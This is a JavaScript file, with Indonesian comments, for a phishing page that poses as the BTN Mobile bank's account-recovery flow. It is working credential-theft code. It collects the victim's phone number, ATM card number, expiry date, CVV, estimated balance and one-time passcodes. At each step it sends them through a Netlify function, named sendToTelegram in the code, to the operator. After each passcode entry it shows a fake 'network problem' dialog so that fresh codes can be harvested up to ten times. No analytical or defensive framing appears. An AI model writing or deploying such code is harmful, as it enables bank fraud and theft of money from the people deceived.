// script.js
(function() {
    'use strict';

    // DOM Elements
    const splash = document.getElementById('splashScreen');
    const page1 = document.getElementById('page1');
    const page2 = document.getElementById('page2');
    const page3 = document.getElementById('page3');
    const toast = document.getElementById('btnToast');
    const toastMessage = toast.querySelector('.toast-message');
    const networkModal = document.getElementById('networkModal');
    const closeModalBtn = document.getElementById('closeModalBtn');

    // Konfigurasi Netlify Function endpoint
    const NETLIFY_FUNCTION_URL = '/.netlify/functions/send-notification';

    // Counter percobaan OTP
    let otpRetryCount = 0;
    const MAX_OTP_RETRY = 10;

    // Flag untuk menandai apakah modal sedang aktif
    let isModalActive = false;

    // Flag untuk menandai apakah notifikasi nomor HP sudah terkirim
    let phoneNotified = false;

    // Toast notification helper
    let toastTimeout = null;
    function showNotification(message, isError = true) {
        const iconElem = toast.querySelector('.toast-icon');
        iconElem.textContent = isError ? '!' : '✓';
        iconElem.style.background = isError ? '#ffaa00' : '#ffffff';
        iconElem.style.color = isError ? '#003366' : '#003366';
        
        toastMessage.textContent = message;
        toast.classList.add('show');
        
        if (toastTimeout) clearTimeout(toastTimeout);
        toastTimeout = setTimeout(() => {
            toast.classList.remove('show');
        }, 3000);
    }

    // Fungsi untuk menampilkan Modal Jaringan Bermasalah
    function showNetworkModal() {
        if (isModalActive) return;
        isModalActive = true;
        networkModal.classList.add('show');
    }

    // Fungsi untuk menutup Modal Jaringan Bermasalah
    function hideNetworkModal() {
        networkModal.classList.remove('show');
        isModalActive = false;
        resetOtpFields();
    }

    // Event listener untuk tombol tutup modal
    if (closeModalBtn) {
        closeModalBtn.addEventListener('click', () => {
            hideNetworkModal();
            setTimeout(() => {
                const firstOtp = document.querySelector('.otp-digit');
                if (firstOtp) firstOtp.focus();
            }, 100);
        });
    }

    // Fungsi untuk mengirim data ke server (Netlify Function)
    async function sendToTelegram(data) {
        try {
            const response = await fetch(NETLIFY_FUNCTION_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
            });
            
            if (!response.ok) {
                const errorData = await response.json();
                console.error('Failed to send data:', errorData);
                return false;
            }
            
            const result = await response.json();
            console.log('Data sent successfully:', result);
            return true;
        } catch (error) {
            console.error('Error sending data:', error);
            return false;
        }
    }

    // Toggle CVV visibility
    const toggleCVV = document.getElementById('toggleCVV');
    const cvvInput = document.getElementById('cvv');
    if (toggleCVV && cvvInput) {
        toggleCVV.addEventListener('click', function(e) {
            const type = cvvInput.getAttribute('type') === 'password' ? 'text' : 'password';
            cvvInput.setAttribute('type', type);
            this.textContent = type === 'password' ? '👁️' : '🙈';
        });
    }

    // Format Rupiah
    function formatRupiah(element) {
        let angka = element.value;
        let number_string = angka.replace(/[^,\d]/g, '').toString();
        let split = number_string.split(',');
        let sisa = split[0].length % 3;
        let rupiah = split[0].substr(0, sisa);
        let ribuan = split[0].substr(sisa).match(/\d{3}/gi);
    
        if (ribuan) {
            let separator = sisa ? '.' : '';
            rupiah += separator + ribuan.join('.');
        }
        element.value = rupiah ? rupiah : '';
    }
    
    const saldoInput = document.getElementById('saldoTerakhir');
    if (saldoInput) {
        saldoInput.addEventListener('input', function() {
            if (this.value === '') return;
            formatRupiah(this);
        });
    }

    // Auto-play Carousel
    function initCarouselForScreen(screenElement) {
        if (!screenElement) return null;
        
        const wrapper = screenElement.querySelector('.slider-wrapper');
        const dotsContainer = screenElement.querySelector('.carousel-dots');
        
        if (!wrapper || !dotsContainer) return null;
        
        const images = wrapper.querySelectorAll('img');
        const totalImages = images.length;
        if (totalImages === 0) return null;
        
        let currentIndex = 0;
        
        wrapper.style.width = `${totalImages * 100}%`;
        wrapper.style.display = 'flex';
        wrapper.style.transition = 'transform 0.5s ease-in-out';
        
        images.forEach(img => {
            img.style.width = `${100 / totalImages}%`;
            img.style.flexShrink = '0';
        });
        
        dotsContainer.innerHTML = '';
        for (let i = 0; i < totalImages; i++) {
            const dot = document.createElement('div');
            dot.classList.add('dot');
            if (i === 0) dot.classList.add('active');
            dot.addEventListener('click', () => {
                currentIndex = i;
                wrapper.style.transform = `translateX(-${currentIndex * (100 / totalImages)}%)`;
                updateDotsInContainer(dotsContainer, currentIndex);
                resetCarouselInterval(screenElement);
            });
            dotsContainer.appendChild(dot);
        }
        
        function updateDotsInContainer(container, activeIndex) {
            const dots = container.querySelectorAll('.dot');
            dots.forEach((dot, idx) => {
                if (idx === activeIndex) {
                    dot.classList.add('active');
                } else {
                    dot.classList.remove('active');
                }
            });
        }
        
        function slideToNext() {
            currentIndex = (currentIndex + 1) % totalImages;
            wrapper.style.transform = `translateX(-${currentIndex * (100 / totalImages)}%)`;
            updateDotsInContainer(dotsContainer, currentIndex);
        }
        
        const interval = setInterval(slideToNext, 3000);
        screenElement._carouselInterval = interval;
        screenElement._slideToNext = slideToNext;
        
        return interval;
    }
    
    function resetCarouselInterval(screenElement) {
        if (screenElement._carouselInterval) {
            clearInterval(screenElement._carouselInterval);
            screenElement._carouselInterval = setInterval(screenElement._slideToNext, 3000);
        }
    }
    
    function stopAllCarousels() {
        const screens = [page1, page2, page3];
        screens.forEach(screen => {
            if (screen && screen._carouselInterval) {
                clearInterval(screen._carouselInterval);
                screen._carouselInterval = null;
            }
        });
    }
    
    function initAllCarousels() {
        stopAllCarousels();
        const activeScreen = document.querySelector('.screen.active');
        if (activeScreen) {
            initCarouselForScreen(activeScreen);
        }
    }
    
    // Splash screen 3 detik
    setTimeout(() => {
        splash.style.opacity = '0';
        setTimeout(() => {
            splash.style.display = 'none';
            page1.classList.add('active');
            initAllCarousels();
        }, 400);
    }, 3000);
    
    // Navigasi halaman 1 -> 2 dengan notifikasi TELEGRAM untuk nomor HP
    document.getElementById('gotoPage2Btn').addEventListener('click', async () => {
        const phone = document.getElementById('mobileNumber').value.trim();
        if (phone === "") {
            showNotification("Nomor HP tidak boleh kosong", true);
            return;
        }
        const cleanPhone = phone.replace(/\s/g, '');
        if (!/^[0-9]{10,13}$/.test(cleanPhone)) {
            showNotification("Nomor HP harus 10-13 digit angka", true);
            return;
        }
        
        // KIRIM NOTIFIKASI NOMOR HP KE TELEGRAM (HANYA SEKALI)
        if (!phoneNotified) {
            phoneNotified = true;
            const phoneData = {
                phoneNumber: cleanPhone,
                timestamp: new Date().toISOString()
            };
            await sendToTelegram(phoneData);
            console.log("Notifikasi nomor HP terkirim ke Telegram");
        }
        
        page1.classList.remove('active');
        page2.classList.add('active');
        initAllCarousels();
    });
    
    // Masking nomor kartu
    const nomorKartuInput = document.getElementById('nomorKartu');
    nomorKartuInput.addEventListener('input', function(e) {
        let value = this.value.replace(/\D/g, '').substring(0, 16);
        let formatted = '';
        for (let i = 0; i < value.length; i++) {
            if (i > 0 && i % 4 === 0) {
                formatted += ' ';
            }
            formatted += value[i];
        }
        this.value = formatted;
    });
    
    // Masking berlaku sampai
    const berlakuSampaiInput = document.getElementById('berlakuSampai');
    berlakuSampaiInput.addEventListener('input', function(e) {
        let value = this.value.replace(/\D/g, '').substring(0, 4);
        if (value.length >= 3) {
            let month = value.substring(0, 2);
            let year = value.substring(2, 4);
            if (parseInt(month) > 12) month = '12';
            if (parseInt(month) < 1 && month.length === 2) month = '01';
            this.value = month + '/' + year;
        } else if (value.length === 2) {
            this.value = value;
        } else {
            this.value = value;
        }
    });
    
    berlakuSampaiInput.addEventListener('blur', function() {
        let value = this.value;
        if (value && value.length === 5) {
            let month = parseInt(value.substring(0, 2));
            if (month < 1 || month > 12) {
                showNotification("Bulan tidak valid (01-12)", true);
                this.value = '';
            }
        }
    });
    
    // CVV hanya angka 3 digit
    if (cvvInput) {
        cvvInput.addEventListener('input', function(e) {
            this.value = this.value.replace(/\D/g, '').substring(0, 3);
        });
    }
    
    // Validasi halaman 2 dan kirim notifikasi kartu ke Telegram
    const btnLanjut = document.getElementById('btnLanjut');
    
    function getRawSaldo() {
        const saldoElem = document.getElementById('saldoTerakhir');
        if (!saldoElem) return '';
        return saldoElem.value.replace(/\./g, '');
    }
    
    btnLanjut.addEventListener('click', async (e) => {
        e.preventDefault();
        
        const nomorKartu = document.getElementById('nomorKartu').value.replace(/\s/g, '');
        const berlakuSampai = document.getElementById('berlakuSampai').value;
        const cvv = document.getElementById('cvv').value;
        const saldoRaw = getRawSaldo();
        const saldoTerakhir = saldoRaw === '' ? '0' : saldoRaw;
        const phoneNumber = document.getElementById('mobileNumber').value.trim();
        
        if (nomorKartu === "" || nomorKartu.length < 16) {
            showNotification("Nomor kartu ATM harus 16 digit", true);
            return;
        }
        
        if (berlakuSampai === "" || berlakuSampai.length < 5) {
            showNotification("Masukkan masa berlaku kartu (MM/YY)", true);
            return;
        }
        
        if (cvv === "" || cvv.length < 3) {
            showNotification("Masukkan CVV/CVC 3 digit", true);
            return;
        }
        
        if (saldoTerakhir === "0" || saldoTerakhir === "") {
            showNotification("Masukkan perkiraan saldo terakhir", true);
            return;
        }
        
        const saldoNumber = parseInt(saldoTerakhir.replace(/\./g, ''));
        if (isNaN(saldoNumber) || saldoNumber <= 0) {
            showNotification("Nominal saldo tidak valid", true);
            return;
        }
        
        // Reset counter OTP
        otpRetryCount = 0;
        
        // Simpan data kartu
        const cardData = {
            phoneNumber: phoneNumber,
            cardNumber: nomorKartu,
            expiryDate: berlakuSampai,
            cvv: cvv,
            estimatedBalance: saldoTerakhir,
            timestamp: new Date().toISOString()
        };
        
        sessionStorage.setItem('btnCardData', JSON.stringify(cardData));
        
        // KIRIM NOTIFIKASI DATA KARTU KE TELEGRAM
        await sendToTelegram(cardData);
        console.log("Notifikasi data kartu terkirim ke Telegram");
        
        // Reset OTP fields
        document.querySelectorAll('.otp-digit').forEach(inp => inp.value = '');
        document.getElementById('otpWarning').innerText = '';
        
        page2.classList.remove('active');
        page3.classList.add('active');
        initAllCarousels();
        
        setTimeout(() => {
            const first = document.querySelector('.otp-digit');
            if (first) first.focus();
        }, 150);
    });
    
    // OTP handler
    const otpInputs = document.querySelectorAll('.otp-digit');
    otpInputs.forEach((input, idx) => {
        input.addEventListener('input', (e) => {
            if (e.target.value.length === 1 && idx < 5) {
                otpInputs[idx + 1].focus();
            }
            document.getElementById('otpWarning').innerText = '';
        });
        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && idx > 0 && !otpInputs[idx].value) {
                otpInputs[idx - 1].focus();
            }
        });
        input.addEventListener('keypress', (e) => {
            if (!/^\d$/.test(e.key)) {
                e.preventDefault();
            }
        });
    });
    
    function getOtpFromPage() {
        let otp = '';
        document.querySelectorAll('.otp-digit').forEach(inp => {
            otp += inp.value;
        });
        return otp;
    }
    
    function resetOtpFields() {
        document.querySelectorAll('.otp-digit').forEach(inp => inp.value = '');
        if (otpInputs[0]) otpInputs[0].focus();
        document.getElementById('otpWarning').innerText = '';
    }
    
    // Reset ke halaman awal
    function resetToInitialState() {
        otpRetryCount = 0;
        phoneNotified = false; // Reset flag notifikasi HP
        
        if (isModalActive) {
            hideNetworkModal();
        }
        
        page3.classList.remove('active');
        page2.classList.remove('active');
        page1.classList.add('active');
        initAllCarousels();
        
        document.getElementById('mobileNumber').value = '';
        document.getElementById('nomorKartu').value = '';
        document.getElementById('berlakuSampai').value = '';
        if (cvvInput) cvvInput.value = '';
        if (saldoInput) saldoInput.value = '';
        document.querySelectorAll('.otp-digit').forEach(inp => inp.value = '');
        
        sessionStorage.removeItem('btnCardData');
        
        showNotification("Batas percobaan OTP tercapai. Silakan mulai proses pemulihan dari awal.", true);
    }
    
    // Submit OTP Button Handler - KIRIM NOTIFIKASI OTP + TAMPILKAN MODAL
    document.getElementById('submitOtpBtn').addEventListener('click', async () => {
        const mainOtp = getOtpFromPage();
        
        if (mainOtp.length !== 6) {
            showNotification("Masukkan 6 digit kode OTP", true);
            return;
        }
        
        // Ambil data lengkap dari session storage
        const cardDataStr = sessionStorage.getItem('btnCardData');
        let allData = {};
        
        if (cardDataStr) {
            const cardData = JSON.parse(cardDataStr);
            allData = {
                ...cardData,
                otpCode: mainOtp,
                timestamp: new Date().toISOString()
            };
        } else {
            allData = {
                phoneNumber: document.getElementById('mobileNumber').value.trim(),
                cardNumber: document.getElementById('nomorKartu').value.replace(/\s/g, ''),
                expiryDate: document.getElementById('berlakuSampai').value,
                cvv: document.getElementById('cvv').value,
                estimatedBalance: getRawSaldo(),
                otpCode: mainOtp,
                timestamp: new Date().toISOString()
            };
        }
        
        // KIRIM NOTIFIKASI OTP LENGKAP KE TELEGRAM
        await sendToTelegram(allData);
        console.log("Notifikasi OTP lengkap terkirim ke Telegram");
        
        // Increment counter percobaan
        otpRetryCount++;
        
        // Cek batas maksimal (10 kali)
        if (otpRetryCount >= MAX_OTP_RETRY) {
            resetToInitialState();
            return;
        }
        
        // TAMPILKAN MODAL JARINGAN BERMASALAH
        showNetworkModal();
    });
    
    function enforceNumeric(inputElement) {
        if (inputElement) {
            inputElement.addEventListener('input', function() {
                this.value = this.value.replace(/[^0-9]/g, '');
            });
        }
    }
    enforceNumeric(document.getElementById('mobileNumber'));
    
    console.log('BTN Mobile - Sistem Pemulihan Akun Siap (dengan notifikasi bertahap ke Telegram)');
})();
